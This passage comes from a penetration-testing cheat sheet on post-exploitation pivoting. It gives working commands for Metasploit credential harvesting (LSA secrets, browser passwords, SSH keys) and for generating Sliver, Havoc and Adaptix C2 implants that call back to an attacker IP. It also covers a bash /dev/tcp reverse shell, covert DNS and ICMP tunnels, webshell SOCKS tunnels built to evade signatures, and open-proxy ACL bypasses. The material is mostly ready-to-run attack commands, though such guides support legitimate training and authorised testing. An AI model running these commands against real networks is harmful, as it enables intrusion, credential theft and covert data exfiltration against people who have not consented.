```bash
# Collect credentials from various sources
run post/windows/gather/credentials/credential_collector

# SSH keys on Linux targets
run post/multi/gather/ssh_creds

# Browser saved passwords
run post/windows/gather/enum_chrome

# LSA secrets (service account passwords, cached creds)
run post/windows/gather/lsa_secrets
```

#### Autoroute + SOCKS Proxy

For routing traffic through the Meterpreter session into internal subnets and exposing a SOCKS proxy for external tools, see [Add Routes to Internal Subnets](#add-routes-to-internal-subnets) and [SOCKS Proxy (for External Tools)](#socks-proxy-for-external-tools) above.

#### Session Management
```bash
sessions -l                  # List all active sessions
sessions -i <SESSION_ID>     # Interact with a session
meterpreter> background      # Background current session (or Ctrl+Z)
sessions -K                  # Kill all sessions
sessions -k <SESSION_ID>     # Kill a specific session
```

#### Port Forwarding from Meterpreter
```bash
# Forward a local port to a remote service through the Meterpreter tunnel
meterpreter> portfwd add -l <LOCAL_PORT> -p <REMOTE_PORT> -r <TARGET_IP>

# Reverse port forward — target listens on a port, traffic forwarded back to attacker
# -R = reverse  -l = attacker port to receive  -p = port the target listens on  -L = attacker IP
meterpreter> portfwd add -R -l <ATTACKER_PORT> -p <TARGET_LISTEN_PORT> -L <ATTACKER_IP>

# Management
meterpreter> portfwd list
meterpreter> portfwd delete -l <LOCAL_PORT> -p <REMOTE_PORT> -r <TARGET_IP>
meterpreter> portfwd flush
```

**Reverse portfwd scenario** — catch reverse shells from deeper hosts through the pivot:
```bash
# Scenario: You have Meterpreter on Host A (pivot). Host B is deeper and can only reach Host A.
# Goal: Get a reverse shell from Host B back to your attacker.

# Step 1: On your attacker, start a listener on port 4444
#   msfconsole: use exploit/multi/handler; set LPORT 4444; run -j

# Step 2: In Meterpreter session on Host A, create a reverse port forward:
meterpreter> portfwd add -R -l 4444 -p 9000 -L <ATTACKER_IP>
# Host A now listens on :9000. Any connection to Host A:9000 → forwarded to attacker:4444

# Step 3: Trigger a reverse shell on Host B targeting Host A:9000
#   e.g., bash -i >& /dev/tcp/<PIVOT_HOST_1_INTERNAL_IP>/9000 0>&1
# The shell arrives at your attacker's handler on port 4444

# Expose a target's local service (target has web app on 127.0.0.1:8080):
meterpreter> portfwd add -l 8080 -p 8080 -r 127.0.0.1
# ATTACKER: curl http://127.0.0.1:8080 → reaches target's localhost:8080
```

[Back to top](#table-of-contents)

---

## C2 Framework Pivoting

### Sliver C2 — Pivoting

> **Why Sliver:** Open-source, cross-platform implants, mTLS/WireGuard/HTTP(S)/DNS transports, built-in SOCKS5 proxy, and pivot listeners for multi-hop chains. No license required.

#### Setup & Implant Generation
```bash
# Install Sliver (attacker machine)
curl https://sliver.sh/install | sudo bash
# Start the server
sliver-server

# Generate implant (choose transport based on egress rules)
sliver > generate --mtls <ATTACKER_IP> --os windows --arch amd64 --save /tmp/implant.exe
sliver > generate --mtls <ATTACKER_IP> --os linux --arch amd64 --save /tmp/implant

# HTTP(S) implant (when only web traffic allowed out)
sliver > generate --http <ATTACKER_IP> --os windows --save /tmp/implant_http.exe

# Start listener
sliver > mtls --lhost 0.0.0.0 --lport 8888
sliver > https --lhost 0.0.0.0 --lport 443
```

#### SOCKS5 Proxy Through Implant
```bash
# Once implant calls back, interact with it
sliver > sessions           # list active sessions
sliver > use <SESSION_ID>

# Start SOCKS5 proxy through the implant (route all traffic through pivot)
sliver (IMPLANT) > socks5 start
# [*] Started SOCKS5 proxy on 127.0.0.1:1081

# Use with proxychains (edit /etc/proxychains4.conf → socks5 127.0.0.1 1081)
proxychains4 nmap -sT -Pn -p 445,3389,5985 <INTERNAL_SUBNET>/24
proxychains4 netexec smb <INTERNAL_SUBNET>/24 -u '<USER>' -p '<PASSWORD>'
proxychains4 evil-winrm -i <INTERNAL_TARGET> -u '<USER>' -p '<PASSWORD>'

# Stop proxy
sliver (IMPLANT) > socks5 stop
```

#### Port Forwarding
```bash
# Forward local port to internal service through implant
sliver (IMPLANT) > portfwd add --bind 127.0.0.1:8080 --remote <INTERNAL_IP>:80
sliver (IMPLANT) > portfwd add --bind 127.0.0.1:5985 --remote <INTERNAL_IP>:5985

# Access: curl http://127.0.0.1:8080 → reaches internal web server

sliver (IMPLANT) > portfwd list
sliver (IMPLANT) > portfwd rm --id <FORWARD_ID>
```

#### Multi-Hop Pivot (Pivot Listeners)
```bash
# Scenario: Attacker → Host A (DMZ) → Host B (internal) → Host C (DC segment)

# 1. On Host A implant — start a pivot listener
sliver (HOST_A) > pivots tcp --bind 0.0.0.0:9898
# [*] Started TCP pivot listener on 0.0.0.0:9898

# 2. Generate a pivot implant that connects to Host A (not directly to attacker)
sliver > generate --tcp-pivot <PIVOT_HOST_1_IP>:9898 --os windows --save /tmp/pivot_implant.exe

# 3. Transfer pivot_implant.exe to Host B and execute
# Host B's implant tunnels through Host A back to the C2 server

# 4. Repeat: start pivot listener on Host B, generate pivot implant for Host C
sliver (HOST_B) > pivots tcp --bind 0.0.0.0:9899
sliver > generate --tcp-pivot <PIVOT_HOST_2_IP>:9899 --os windows --save /tmp/pivot2.exe

# Result: Attacker ←mTLS→ Host A ←TCP→ Host B ←TCP→ Host C
# All three implants visible in 'sessions' — SOCKS5/portfwd works on any of them
```

#### WireGuard Transport (VPN-like Access)
```bash
# Generate WireGuard implant — creates a full VPN tunnel to the target network
sliver > generate --wg <ATTACKER_IP> --os linux --save /tmp/implant_wg
sliver > wg --lhost 0.0.0.0 --lport 53   # disguise as DNS

# Once connected, get the WireGuard interface config
sliver (IMPLANT) > wg-config
# Outputs a WireGuard config file — import into wg-quick for full route-based access

# This gives you a tun interface with direct IP access to the internal network
# No proxychains needed — tools work natively
```

### Havoc C2 — Pivoting

```bash
# Install Havoc
git clone https://github.com/HavocFramework/Havoc.git
cd Havoc && make

# Start teamserver
./havoc server --profile profiles/havoc.yaotl -v

# Connect with Havoc client
./havoc client

# Generate Demon agent (Havoc's implant)
# Payloads → Generate → Windows Exe (or Shellcode for loaders)
```

#### SOCKS Proxy & Port Forward
```bash
# In Havoc Demon console (interact with agent):

# Start SOCKS5 proxy
demon > socks add 1080
# → SOCKS5 on 127.0.0.1:1080 — use with proxychains

# Port forward
demon > rportfwd add 8080 <INTERNAL_IP> 80
# → curl http://127.0.0.1:8080 reaches internal web server

demon > rportfwd add 5985 <INTERNAL_IP> 5985
# → evil-winrm -i 127.0.0.1

# List / remove
demon > socks list
demon > socks remove 1080
demon > rportfwd list
demon > rportfwd remove 8080

# Multi-hop: transfer second Demon through first agent's SOCKS
proxychains4 python3 -m http.server 8000  # serve second Demon
# Execute on internal host → second callback through SOCKS chain
```

### Adaptix C2 — Multi-OS Session Management

> **Why Adaptix:** Qt GUI, beacon manager handles many concurrent Linux+Windows sessions cleanly, built-in SOCKS5 + reverse port-forward per beacon. Ships pre-installed on Kali. Use case: GOAD / HTB Pro Labs / multi-host AD ranges where session count climbs past ~5.

#### Server + client
```bash
# Kali — server (binds 4321 client port + listener ports below)
adaptixserver -profile /etc/adaptixserver/profile.json
# Default: client on 4321, no listener until you add one in the GUI

# Kali — client GUI
adaptixclient
# Connect: 127.0.0.1:4321  user: admin  pass: from profile.json (or generated)
```

#### Listener + agent generation (GUI flow)
```text
Listeners → + → BeaconHTTP (or BeaconSMB / BeaconTCP for pivots)
  Host: <ATTACKER_IP>   Port: 8443   SSL: on
Agents → Generate → BeaconHTTP → OS: windows / linux  → save .exe / .elf
```

```bash
# Linux beacon — drop and execute on target
chmod +x beacon.elf && ./beacon.elf &

# Windows beacon — execute via your preferred loader (donut shellcode, EXE, DLL)
.\beacon.exe
```

#### SOCKS5 + port forward through a beacon
```text
# In the Sessions panel, right-click an active beacon → Tunnels:
SOCKS5 server  →  bind: 127.0.0.1   port: 1082
Port forward   →  local 127.0.0.1:5985 → remote <INTERNAL_HOST>:5985
Reverse fwd    →  beacon listens on TARGET:8080 → forwards to attacker:80
```

```bash
# Use the SOCKS5 from any standalone tool
echo "socks5 127.0.0.1 1082" | sudo tee -a /etc/proxychains4.conf
proxychains4 -q nxc smb <INTERNAL_SUBNET>/24 -u '<USER>' -p '<PASSWORD>'
proxychains4 -q evil-winrm -i <INTERNAL_TARGET> -u '<USER>' -p '<PASSWORD>'
```

#### Multi-OS session flow (the actual reason to use it)
```text
# Beacons panel groups Linux + Windows sessions side-by-side with:
#   - hostname / OS / arch / pid / username / integrity
#   - last checkin / sleep interval
#   - pivot graph (parent → child beacons across hops)
# Right-click → Interact opens a tabbed shell — one tab per beacon
# Tasking is async; commands queue per-beacon and reconcile on next checkin
```

```text
# Common tasks from the GUI command prompt (per beacon):
shell whoami /all                       # Windows beacon
shell id; uname -a                      # Linux beacon
upload /opt/tools/winpeas.exe C:\T\w.exe
download C:\Users\Admin\Documents\flag.txt
inline-execute Rubeus.exe kerberoast    # in-memory .NET (Windows) — hash extraction context: [active-directory-methodology.md](active-directory-methodology.md)
execute-assembly SharpHound.exe -c All
ps                                      # process list
sleep 5 30                              # 5s interval, 30% jitter
```

#### Pivot beacon (child through parent)
```text
# On parent beacon — start a pivot listener bound to the parent host
parent > pivot smb \.
parent > pivot tcp 0.0.0.0:9000         # TCP listener on the parent host

# Generate a child beacon configured to call the pivot:
Agents → Generate → BeaconSMB / BeaconTCP → host: <PARENT_IP>  port: 9000
# Drop child on internal target → it tunnels through parent back to teamserver
```

#### Adaptix vs Sliver/Havoc — when to pick which
| Need | Pick |
|---|---|
| GUI session manager, many concurrent beacons, multi-OS view | **Adaptix** |
| CLI-first, scriptable, mature ecosystem | Sliver |
| Team collaboration / teamserver model | Havoc or Sliver multi-operator |
| CPTS exam itself (single beacon at a time) | None — use Ligolo-ng |

> **Caveat:** Adaptix is Qt-GUI-only — every action is point-and-click. Reproduction steps for the report still need to be captured per finding (screenshot the command + output panel). Don't rely on the GUI as your only evidence — paste the textual task output into CherryTree / SysReptor as you go.


### C2 Transport Selection Guide

| Egress Allowed | Recommended Transport | C2 Option |
|----------------|----------------------|-----------|
| All outbound | mTLS (Sliver) / raw TCP | Fastest, most stable |
| Only HTTPS (443) | HTTPS (Sliver/Havoc/Mythic) | Blends with web traffic |
| Only HTTP (80) | HTTP with domain fronting | Evades IP-based blocking |
| Only DNS (53) | DNS (Sliver) / dnscat2 | Slowest but most covert |
| Only ICMP | ptunnel-ng / icmpsh | Very slow, last resort |
| WireGuard/UDP | WireGuard (Sliver) | Full VPN, best performance |

### C2 vs Standalone Tool Decision

| Scenario | Use C2 | Use Standalone Tool |
|----------|--------|-------------------|
| Multi-hop pivot (3+ hops) | ✅ Sliver/Mythic pivot agents | ❌ Ligolo gets complex |
| Long-lived encrypted tunnel | ✅ mTLS/WG implant | ❌ SSH may drop |
| Quick single-port forward | ❌ Overkill | ✅ SSH -L or Chisel |
| Team collaboration | ✅ Mythic web UI / Havoc | ❌ No shared state |
| Multi-platform (Win+Linux) | ✅ Adaptix GUI session manager / Mythic (Apollo+Poseidon) | ❌ Most tools are OS-specific |
| Minimal footprint | ❌ Implant on disk | ✅ SSH (already there) |
| CPTS exam (speed priority) | ✅ Sliver for complex nets | ✅ Ligolo-ng for simple |

[Back to top](#table-of-contents)

---

## Windows-Specific Pivoting

### netsh Port Forwarding
```powershell
# Forward incoming connections on port 4444 to internal target
netsh interface portproxy add v4tov4 listenport=4444 listenaddress=0.0.0.0 connectport=4444 connectaddress=<INTERNAL_TARGET>

# Expose target's own local service to attacker (reverse direction)
# Target has a web app on 127.0.0.1:8080 — make it reachable from outside
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=8080 connectaddress=127.0.0.1
netsh advfirewall firewall add rule name="Expose8080" dir=in action=allow protocol=tcp localport=8080
# ATTACKER: curl http://<TARGET_IP>:8080 → reaches target's localhost:8080

# Relay reverse shell — target catches shell from deeper host, forwards to attacker
netsh interface portproxy add v4tov4 listenport=9000 listenaddress=0.0.0.0 connectport=4444 connectaddress=<ATTACKER_IP>
netsh advfirewall firewall add rule name="Relay9000" dir=in action=allow protocol=tcp localport=9000
# Deeper host sends shell to <TARGET_IP>:9000 → relayed to attacker:4444
# ATTACKER: nc -lvnp 4444  (must be listening first)

# List forwards
netsh interface portproxy show all

# Delete forward
netsh interface portproxy delete v4tov4 listenport=4444 listenaddress=0.0.0.0

# Reset all rules (cleanup after engagement)
netsh interface portproxy reset

# Open firewall port
netsh advfirewall firewall add rule name="Forward" dir=in action=allow protocol=tcp localport=4444
```

> **netsh limitations:** TCP only — no UDP support. Requires Administrator privileges. The `iphlpsvc` (IP Helper) service must be running. Rules are persistent (stored in registry) — always clean up with `netsh interface portproxy reset` after the engagement.

### Plink (PuTTY CLI)
```powershell
# WINDOWS PIVOT → ATTACKER (pivot dials out)
plink.exe -ssh -D 1080 <USER>@<ATTACKER_IP> -pw <PASSWORD> -N
plink.exe -ssh -L 8080:<INTERNAL_TARGET>:80 <USER>@<ATTACKER_IP> -pw <PASSWORD> -N
plink.exe -ssh -R 4444:127.0.0.1:4444 <USER>@<ATTACKER_IP> -pw <PASSWORD> -N

# Auto-accept host key (no prompt)
cmd.exe /c echo y | plink.exe -ssh -D 1080 <USER>@<ATTACKER_IP> -pw <PASSWORD> -N

# Key auth (.ppk format — convert with puttygen if you only have OpenSSH key)
plink.exe -ssh -i C:\Temp\id.ppk -D 1080 <USER>@<ATTACKER_IP> -N
```

```bash
# ATTACKER side — prep before plink callback
sudo systemctl status ssh
sudo useradd -m pivot && sudo passwd pivot

# For -R relays bound on 0.0.0.0:
sudo sed -i 's/^#\?GatewayPorts.*/GatewayPorts yes/' /etc/ssh/sshd_config
sudo systemctl reload ssh

# Convert OpenSSH key → .ppk for plink
puttygen id_rsa -O private -o id.ppk

# Verify
ss -tnp 'sport = :22'         # ESTABLISHED from <PIVOT_IP>
ss -tlnp | grep 1080          # SOCKS up after -D
proxychains4 netexec smb <INTERNAL_SUBNET>/24 -u '<USER>' -p '<PASSWORD>'
```

### Native ssh.exe (Built-in since Windows 10 1809 / Server 2019)

Windows 10 1809+ ships an OpenSSH client at `C:\Windows\System32\OpenSSH\ssh.exe` — fully featured, supports `-L` / `-R` / `-D`, no plink upload required. Pure LOTL pivot when egress permits SSH out.

```powershell
# Local port forward — attacker side: ssh -R, target side: ssh -L (tunnels :80 of INTERNAL through attacker)
ssh.exe -L 8080:<INTERNAL_TARGET>:80 <USER>@<ATTACKER_IP> -N

# Remote port forward — expose Windows target's RDP back to attacker:13389
ssh.exe -R 13389:127.0.0.1:3389 <USER>@<ATTACKER_IP> -N

# Dynamic SOCKS proxy on attacker:1080 — use through proxychains for full pivot
ssh.exe -R 1080 <USER>@<ATTACKER_IP> -N             # OpenSSH 7.6+ supports -R <port> (remote SOCKS)
# More common: SOCKS on Windows-side, attacker connects in via -R port-forward
ssh.exe -D 1080 <USER>@<ATTACKER_IP> -N             # SOCKS on Windows host — attacker tunnels in

# Key auth (avoids password prompt; place key at %USERPROFILE%\.ssh\id_rsa)
ssh.exe -i C:\Users\<USER>\.ssh\id_rsa -L 8080:<INTERNAL>:80 <USER>@<ATTACKER_IP> -N

# Background the tunnel — ssh.exe has no -f on Windows; use Start-Process
Start-Process -WindowStyle Hidden ssh.exe -ArgumentList '-N -R 13389:127.0.0.1:3389 <USER>@<ATTACKER_IP>'

# Verify install
Get-WindowsCapability -Online | ? Name -like 'OpenSSH.Client*'
```

> **Note:** OpenSSH server (`sshd`) is *not* installed by default — only the client. The client supports identity files, ProxyJump (`-J`), and ControlMaster, so multi-hop chains work natively from a Windows pivot.

---

## Proxychains Configuration

```bash
# /etc/proxychains4.conf

# Recommended settings
strict_chain           # Use proxies in order (fail if any breaks)
# dynamic_chain        # Skip dead proxies (for multi-hop)
proxy_dns              # Resolve DNS through proxy
tcp_read_time_out 15000
tcp_connect_time_out 8000

[ProxyList]
socks5 127.0.0.1 1080

# Multi-hop example:
# socks5 127.0.0.1 1080
# socks5 127.0.0.1 1081
```

### Proxychains Usage Tips
```bash
# Always use -sT (TCP connect) with nmap through proxychains
proxychains4 nmap -sT -Pn -p 21,22,80,135,139,445,3389,5985 <INTERNAL_TARGET>

# netexec works well through proxychains
proxychains4 netexec smb <INTERNAL_TARGET> -u '<USER>' -p '<PASSWORD>'

# Some tools don't work through SOCKS (UDP, raw sockets)
# Use port forwards for those instead

# Faster scanning through pivot — use direct port forwards or ligolo routes
```

> **⚠️ Proxychains UDP Limitation — Critical Callout**
>
> SOCKS4/5 proxies do **not** carry UDP payloads. Anything sent over proxychains that uses UDP fails silently — the syscall succeeds locally but no datagram ever leaves the SOCKS endpoint.
>
> | Action | Behaviour through proxychains |
> |---|---|
> | `nmap -sU` | All ports report `open\|filtered` (false negative) |
> | `dig @<DNS>` | Hangs / returns nothing |
> | `snmpwalk` / `snmpget` | No reply, looks like "no community works" |
> | `nbtscan`, `responder`, raw ICMP | Silently dropped |
> | `nmap -sT -Pn` (TCP connect) | ✅ works |
> | `nmap -sS` (SYN raw) | ❌ needs raw sockets, not supported |
>
> **Workarounds:**
> 1. Use `nmap -sT -Pn` (TCP connect) only when forced through proxychains.
> 2. For UDP service enumeration through a pivot, switch transports:
>    - **ligolo-ng** (route-based via `tun`) — carries UDP transparently. See `Ligolo-ng` section above.
>    - **sshuttle** (`--dns` for DNS over SSH) — routes UDP DNS, but not arbitrary UDP.
>    - Local UDP forward via socat or ligolo `listener_add` for a single service:
>      `socat UDP-LISTEN:161,fork,reuseaddr UDP:<INTERNAL_TARGET>:161`
> 3. For DNS specifically, set `proxy_dns` in proxychains4.conf so name resolution uses TCP DNS via the SOCKS proxy.
>
> Confirm with: `proxychains4 nmap -sU -p 161 <INTERNAL_TARGET>` returns nothing useful even when SNMP is open. Re-run via ligolo to verify.

---

## Open HTTP Proxy Abuse (Squid / mod_proxy as a Pivot)

A misconfigured Squid / Apache mod_proxy / nginx-as-forward-proxy is a pivot you didn't have to compromise — proxychains supports an `http` upstream just like SOCKS, so any tool routed through proxychains can reach services bound to the proxy host's `127.0.0.1` or internal IPs the proxy can route to.

### Fingerprint the Proxy
```bash
# NSE — open-proxy + Squid-specific scripts
nmap -p <PROXY_PORT> -sV --script http-open-proxy,http-proxy-brute <PROXY_HOST>
nmap -p <PROXY_PORT> --script http-headers,http-squid-cachemgr <PROXY_HOST>

# Manual — does it relay? GET-style proxying
curl -x http://<PROXY_HOST>:<PROXY_PORT> http://127.0.0.1/ -I
curl -x http://<PROXY_HOST>:<PROXY_PORT> http://<INTERNAL_TARGET>/ -I

# Manual — does it allow CONNECT (TLS / arbitrary TCP tunnelling)?
curl -x http://<PROXY_HOST>:<PROXY_PORT> -X CONNECT http://127.0.0.1:22
printf 'CONNECT 127.0.0.1:22 HTTP/1.1\r\nHost: 127.0.0.1:22\r\n\r\n' | nc <PROXY_HOST> <PROXY_PORT>

# Response clues: Server: squid/<ver>, Via: 1.1 <host> (squid/...), X-Cache:, X-Squid-Error:
```

> **Tip:** A `Via:` header in the response almost always means the box is relaying. Squid versions also leak in `Server:` / `X-Squid-Error:`.

### Wire Into Proxychains as HTTP Upstream
```bash
# /etc/proxychains4.conf — proxychains supports `http` just like socks4/5
strict_chain
proxy_dns
tcp_read_time_out 15000
tcp_connect_time_out 8000

[ProxyList]
http <PROXY_HOST> <PROXY_PORT>

# With basic-auth required
# http <PROXY_HOST> <PROXY_PORT> <USER> <PASSWORD>
```

### Scan & Reach Internal Services Through the Proxy
```bash
# CONNECT-based proxies relay TCP only — must use -sT, never -sS
proxychains4 -q nmap -n -sT -Pn -p 22,80,443,3306,5432,6379,8080,8443 127.0.0.1
proxychains4 -q nmap -n -sT -Pn -p- --min-rate 200 127.0.0.1

# Sweep RFC1918 the proxy can reach
proxychains4 -q nmap -n -sT -Pn -p 80,443,445,3389 <SUBNET>

# Service-level access — anything TCP works through CONNECT
proxychains4 -q ssh <USER>@127.0.0.1
proxychains4 -q curl http://127.0.0.1:<INTERNAL_TARGET>/
proxychains4 -q mysql -h 127.0.0.1 -u <USER> -p
proxychains4 -q nxc smb <INTERNAL_TARGET> -u '<USER>' -p '<PASSWORD>'
proxychains4 -q evil-winrm -i <INTERNAL_TARGET> -u '<USER>' -p '<PASSWORD>'
```

### Browser / Burp Pivot
```text
# Browser → HTTP/HTTPS proxy = <PROXY_HOST>:<PROXY_PORT>
# Burp → User options → Upstream proxy servers → <PROXY_HOST>:<PROXY_PORT>
# Reaches admin panels bound to the proxy's 127.0.0.1 that aren't externally exposed
```

### When CONNECT Is Restricted to 443 Only
```bash
# Squid often allows CONNECT 443 but blocks CONNECT to other ports.
# GET-style proxying still works against plain-HTTP services on any port:
curl -x http://<PROXY_HOST>:<PROXY_PORT> http://127.0.0.1:<INTERNAL_TARGET>/
curl -x http://<PROXY_HOST>:<PROXY_PORT> http://<INTERNAL_TARGET>:8080/admin

# ACL-bypass tricks — Host header / X-Forwarded-For trust
curl -x http://<PROXY_HOST>:<PROXY_PORT> -H 'Host: localhost' http://<PROXY_HOST>/admin
curl -x http://<PROXY_HOST>:<PROXY_PORT> -H 'X-Forwarded-For: 127.0.0.1' http://<PROXY_HOST>/server-status
```

> **OPSEC:** Squid logs every relayed request to `/var/log/squid/access.log` with source IP + CONNECT/GET target. A proxychains nmap looks like a flood of CONNECT attempts in seconds. Throttle (`--min-rate 50`), restrict to known-interesting ports, and prefer GET-style relay over wide-port CONNECT sweeps when log noise matters.

> **Tip:** Enumerate `127.0.0.1` first — services bound to loopback that aren't exposed externally are exactly what an open proxy lets you reach. Then sweep RFC1918 ranges the proxy host can route to.

---

## DNS Tunneling (dnscat2)

DNS-based covert channel. Works when only DNS (UDP 53) is allowed outbound.

### dnscat2 Setup
```bash
# https://github.com/iagox86/dnscat2
# ATTACKER: Start dnscat2 server
# Option 1: Direct connection (no real domain needed)
ruby dnscat2.rb --no-cache

# Option 2: With a domain you control (stealthier)
ruby dnscat2.rb <YOUR_DOMAIN> --no-cache

# TARGET (Linux):
./dnscat --dns server=<ATTACKER_IP>,port=53 --secret=<SECRET>

# TARGET (Windows):
.\dnscat2-v0.07-client-win32.exe --dns server=<ATTACKER_IP>,port=53 --secret=<SECRET>

# Or via PowerShell (dnscat2-powershell):
# https://github.com/lukebaggett/dnscat2-powershell
Import-Module .\dnscat2.ps1
Start-Dnscat2 -Domain <YOUR_DOMAIN> -DNSServer <ATTACKER_IP>
```

### Usage
```bash
# In dnscat2 server console:
windows           # List sessions
window -i <ID>    # Interact with session
shell             # Get a shell
download <file>   # Download file from target
upload <file>     # Upload file to target
listen 0.0.0.0:4444 <INTERNAL_IP>:4444    # Port forward through DNS
```

---

## DNS Tunneling (iodine)

IP-over-DNS tunnel. Creates a virtual network interface over DNS — higher throughput than dnscat2.

### Setup
```bash
# https://github.com/yarrick/iodine
# Requires: a domain you control with an NS record pointing to your server
# Example: Create NS record: t1.yourdomain.com → your_server_ip

# ATTACKER: Start iodine server
sudo iodined -f -c -P <PASSWORD> 10.0.0.1 t1.<YOUR_DOMAIN>
# -f = foreground, -c = disable client IP check, -P = password
# 10.0.0.1 = IP assigned to server end of tunnel

# TARGET: Connect iodine client
# Linux:
sudo iodine -f -P <PASSWORD> <DNS_SERVER_IP> t1.<YOUR_DOMAIN>
# The client gets assigned 10.0.0.2 (or next available)

# Windows:
# Use iodine Windows client (requires TAP adapter installed)
iodine.exe -f -P <PASSWORD> <DNS_SERVER_IP> t1.<YOUR_DOMAIN>
```

### Usage
```bash
# After tunnel is established:
# Server (attacker) = 10.0.0.1
# Client (target) = 10.0.0.2

# SSH through the DNS tunnel
ssh <USER>@10.0.0.2

# Use as SOCKS proxy
ssh -D 1080 <USER>@10.0.0.2
# Then proxychains through 127.0.0.1:1080

# Port forward through the tunnel
ssh -L 8080:<INTERNAL_TARGET>:80 <USER>@10.0.0.2

# iodine provides ~100-500 KB/s throughput depending on DNS server
# Much faster than dnscat2 for file transfers
```

---

## ICMP Tunneling

Works when only ICMP (ping) is allowed outbound. Encapsulates TCP traffic inside ICMP echo packets.

### ptunnel-ng
```bash
# https://github.com/utoni/ptunnel-ng
# ATTACKER: Start ptunnel-ng server (proxy)
sudo ptunnel-ng -r<PIVOT_IP> -R22

# TARGET (pivot host): Start ptunnel-ng client
sudo ptunnel-ng -p<ATTACKER_IP> -l2222 -r<INTERNAL_TARGET> -R22

# ATTACKER: Connect through the ICMP tunnel
ssh -p 2222 <USER>@127.0.0.1
# This SSH connection is tunneled through ICMP to <INTERNAL_TARGET>:22
```

### icmpsh (Windows target, no admin needed)
```bash
# https://github.com/bdamele/icmpsh
# ATTACKER: Disable ICMP replies (so icmpsh can handle them)
sudo sysctl -w net.ipv4.icmp_echo_ignore_all=1

# ATTACKER: Start listener
python3 icmpsh_m.py <ATTACKER_IP> <TARGET_IP>

# TARGET (Windows): Run icmpsh slave
icmpsh.exe -t <ATTACKER_IP>
# Gives a reverse shell over ICMP — bypasses firewall rules blocking TCP/UDP
```

---

## Webshell Tunnels

HTTP-only egress through an existing webshell — when chisel/ligolo/SSH aren't possible because the only outbound channel is the webserver itself.

### reGeorg
```bash
# https://github.com/sensepost/reGeorg
# Drop matching tunnel script on target webserver (matches the server stack):
#   tunnel.aspx (IIS), tunnel.jsp (Tomcat/Jetty), tunnel.php (Apache/Nginx+PHP), tunnel.nosocket.php

# ATTACKER — start the SOCKS proxy that speaks HTTP to the webshell
python2 reGeorgSocksProxy.py -u http://<TARGET>/tunnel.aspx -p 9999
# → SOCKS5 on attacker 127.0.0.1:9999

# /etc/proxychains4.conf → socks5 127.0.0.1 9999
proxychains4 nmap -sT -Pn -p 22,80,135,139,445,3389,5985 <INTERNAL_TARGET>
proxychains4 netexec smb <INTERNAL_SUBNET>/24 -u '<USER>' -p '<PASSWORD>'
```

### Neo-reGeorg (encrypted variant)
```bash
# https://github.com/L-codes/Neo-reGeorg
# Generates obfuscated, key-encrypted tunnel files — evades static signatures on reGeorg

# ATTACKER — generate the tunnel scripts with a shared key
python3 neoreg.py generate -k <KEY>
# → outputs neoreg_servers/tunnel.{aspx,ashx,jsp,jspx,php} ready to drop

# Drop the matching tunnel.<ext> on the target webserver via the existing webshell

# ATTACKER — connect to the deployed tunnel
python3 neoreg.py -k <KEY> -u http://<TARGET>/tunnel.php
# → SOCKS5 on attacker 127.0.0.1:1080 by default
# Override port: -l 127.0.0.1 -p 9999

# Use through proxychains as normal
proxychains4 nmap -sT -Pn <INTERNAL_TARGET>
```

### pivotnacci (single-shell HTTP tunnel)
```bash
# https://github.com/blackarrowsec/pivotnacci
# Single-agent HTTP/HTTPS SOCKS — drops one agent file matching the server stack

# Drop pivotnacci agent on target (matches stack):
#   agent.aspx / agent.jsp / agent.php — pre-built in pivotnacci/agents/

# ATTACKER — connect (SOCKS5 on 127.0.0.1:1080 by default)
pivotnacci http://<TARGET>/agent.jsp
# Custom port:
pivotnacci http://<TARGET>/agent.jsp --listen-port 9999

# Behind proxy / with auth headers
pivotnacci http://<TARGET>/agent.jsp --header "Cookie: session=<SESSION>" --proxy http://<PROXY>:8080

proxychains4 evil-winrm -i <INTERNAL_TARGET> -u '<USER>' -p '<PASSWORD>'
```

> **When to use:** Only HTTP egress allowed via existing webshell — no chisel/ligolo/SSH possible. All three tunnel SOCKS over HTTP requests (chunked POST polling), so latency is high — use `-sT -Pn` and small port ranges. reGeorg = original/widely-detected; Neo-reGeorg = encrypted, evades reGeorg sigs; pivotnacci = single-agent, simpler deployment.

---

## Port-Knocking — Bypass Filtered SSH/Service Ports

`knockd` watches for a pre-defined sequence of TCP/UDP packets and only then runs `start_command` (typically `iptables`/`ufw allow from %IP% to any port 22`). The port appears `filtered`/closed in nmap until the sequence is replayed, opens for `cmd_timeout` seconds, then closes again. Loot the config first to learn the sequence — then replay.

### Find the knockd config
```bash
# Common paths once you have a file-read primitive (LFI, low-priv shell, SSRF→file://)
cat /etc/knockd.conf
cat /etc/default/knockd
ls -la /opt/*/knockd.conf 2>/dev/null
ls -la /home/*/.secret/knockd.conf 2>/dev/null
cat /root/knockd.conf  # only if root read achieved

# Config of interest
#   [openSSH]
#     sequence    = 7000,8000,9000
#     seq_timeout = 5
#     tcpflags    = syn          ← absent or "udp" means UDP knock
#     start_command = /sbin/iptables -A INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
#     cmd_timeout   = 10
#     stop_command  = /sbin/iptables -D INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
```

### Replay the sequence
```bash
# Method 1 — knock binary (apt install knockd; ships /usr/bin/knock)
knock -v <TARGET> 7000:tcp 8000:tcp 9000:tcp -d 100
knock -v <TARGET> 40809:udp 50212:udp 46969:udp -d 100   # UDP variant

# Method 2 — pure-bash UDP knock (no tools, LOTL on a pivot host)
for p in 40809 50212 46969; do echo > /dev/udp/<TARGET>/$p; sleep 0.2; done

# Method 3 — TCP SYN knock with nmap (when sequence uses :tcp)
for p in 7000 8000 9000; do nmap -Pn --max-retries 0 -p $p <TARGET>; done

# Method 4 — hping3 explicit SYN flag (precise timing, no full handshake)
for p in 7000 8000 9000; do sudo hping3 -c 1 -S -p $p <TARGET>; done

# Method 5 — python (works on minimal pivots, no knockd package)
python3 -c "
import socket, time
for p in [40809, 50212, 46969]:
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.sendto(b'', ('<TARGET>', p))
    s.close(); time.sleep(0.2)
"
```

### Confirm + connect inside the window
```bash
# cmd_timeout typically 10–30s — connect immediately
nmap -Pn -p 22 <TARGET>            # was filtered, now open
ssh <USER>@<TARGET> -i id_rsa
```

### Reliable third-party knocker
```bash
# https://github.com/grongor/knock
python3 knock.py <TARGET> -u 40809 50212 46969 -d 10
python3 knock.py <TARGET> -t 7000 8000 9000 -d 10
```

> **Tip:** Honour the order in `sequence =` exactly. UDP knocks need ~100ms inter-packet delay — too fast and the kernel reorders, too slow and `seq_timeout` fires and the partial sequence is discarded.

